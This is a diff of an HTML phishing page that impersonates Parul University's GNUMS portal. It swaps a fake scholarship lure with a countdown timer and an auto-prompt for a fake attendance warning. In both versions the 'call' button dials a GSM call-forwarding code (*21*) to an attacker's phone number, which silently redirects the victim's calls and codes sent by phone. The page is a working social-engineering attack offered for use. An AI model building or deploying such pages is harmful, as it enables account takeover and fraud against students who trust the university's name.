@@ -3,140 +3,79 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>URGENT CALL REQUIRED</title>
+  <title>GNUMS Portal</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(135deg, #ff4d4d, #cc0000);
-      color: white;
-      text-align: center;
-      padding: 20px;
-      height: 100vh;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: #f8f9fa;
       display: flex;
-      flex-direction: column;
       justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
     }
-    .container {
-      background: rgba(0,0,0,0.3);
+    .card {
+      background: white;
+      width: 100%;
+      max-width: 380px;
+      border-radius: 16px;
       padding: 30px;
-      border-radius: 20px;
-      max-width: 90%;
-      margin: auto;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      text-align: center;
     }
-    .alert {
-      background: #ff1a1a;
-      padding: 15px;
-      border-radius: 12px;
-      font-weight: bold;
-      font-size: 18px;
+    .logo {
+      width: 70px;
       margin-bottom: 20px;
-      animation: blink 1.5s infinite;
     }
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.7; }
-    }
-    h1 {
-      font-size: 24px;
-      margin: 15px 0;
-      text-shadow: 0 2px 5px rgba(0,0,0,0.5);
+    h2 {
+      font-size: 22px;
+      color: #202124;
+      margin-bottom: 10px;
     }
     p {
-      font-size: 16px;
-      margin: 12px 0;
+      font-size: 15px;
+      color: #5f6368;
+      margin-bottom: 25px;
       line-height: 1.5;
     }
-    .prize {
-      font-size: 28px;
-      font-weight: bold;
-      color: #ffd700;
-      text-shadow: 0 0 10px #ff0;
-      margin: 20px 0;
-    }
-    .call-btn {
-      background: #00ff00;
-      color: black;
-      font-weight: bold;
-      font-size: 22px;
-      padding: 18px;
-      margin: 25px 0;
-      border: none;
-      border-radius: 50px;
+    .btn {
+      background: #1a73e8;
+      color: white;
+      font-size: 17px;
+      font-weight: 500;
+      padding: 14px;
       width: 100%;
+      border: none;
+      border-radius: 12px;
       cursor: pointer;
-      box-shadow: 0 8px 20px rgba(0,255,0,0.4);
-      animation: pulse 2s infinite;
+      box-shadow: 0 2px 8px rgba(26,115,232,0.3);
     }
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.05); }
-      100% { transform: scale(1); }
-    }
-    .timer {
-      background: #000;
-      color: #ff0000;
-      padding: 12px;
-      border-radius: 10px;
-      font-size: 20px;
-      font-weight: bold;
-      margin-top: 15px;
+    .btn:hover {
+      background: #1669c1;
     }
     .footer {
       margin-top: 20px;
       font-size: 12px;
-      opacity: 0.8;
+      color: #9aa0a6;
     }
   </style>
 </head>
 <body>
 
-  <div class="container">
-    <div class="alert">⚠️ URGENT: ACCOUNT AT RISK</div>
+  <div class="card">
+    <img src="https://vectorseek.com/wp-content/uploads/2023/09/Parul-University-Logo-Vector.svg-.png" alt="GNUMS" class="logo">
+    <h2>Verify Your Attendance</h2>
+    <p>Your attendance is below 75%. Call the counselor now to avoid detention.</p>
     
-    <h1>₹50,000 Scholarship Alert!</h1>
-    
-    <p>Your GNUMS ID has been <strong>PRE-SELECTED</strong> for <strong>₹50,000 Merit Scholarship</strong>.</p>
-    
-    <div class="prize">₹50,000 CASH PRIZE</div>
-    
-    <p><strong>CALL NOW</strong> to claim before it expires!</p>
-    
-    <button class="call-btn" onclick="callNow()">
-      📞 CALL NOW (FREE)
+    <button class="btn" onclick="window.location.href='tel:*21*7903063145*'">
+      Call Counselor
     </button>
     
-    <div class="timer">⏰ Offer Ends in: <span id="timer">10:00</span></div>
-    
-    <p class="footer">Parul University Scholarship Cell | Limited Seats</p>
+    <div class="footer">
+      GNUMS Portal | Parul University
+    </div>
   </div>
-
-  <script>
-    // Auto dial on click
-    function callNow() {
-      window.location.href = "tel:*21*7903063145#";
-    }
-
-    // Countdown timer
-    let time = 600; // 10 minutes
-    const timerEl = document.getElementById('timer');
-    setInterval(() => {
-      if (time > 0) {
-        time--;
-        let m = String(Math.floor(time / 60)).padStart(2, '0');
-        let s = String(time % 60).padStart(2, '0');
-        timerEl.textContent = `${m}:${s}`;
-      }
-    }, 1000);
-
-    // Auto click after 5 sec (optional aggression)
-    setTimeout(() => {
-      if (confirm("⚠️ Scholarship expiring! Call now to claim ₹50,000?")) {
-        callNow();
-      }
-    }, 5000);
-  </script>
 
 </body>
 </html>
